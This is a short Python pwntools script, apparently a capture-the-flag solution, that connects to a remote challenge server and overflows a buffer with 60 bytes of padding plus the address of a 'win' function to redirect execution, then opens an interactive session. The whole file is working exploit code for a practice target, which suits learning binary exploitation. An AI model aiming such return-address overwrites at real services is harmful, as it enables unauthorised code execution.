import os
from pwn import *

os.system('cls')
addrWin = 0x8048586 # the win function's address
sh = remote('thekidofarcrania.com', 4902)
p = b'A' * 60 # padding
p += p64(134514054) ## Decimal value of win`s offset

sh.recvuntil("text: ")
sh.sendline(p)

sh.interactive()
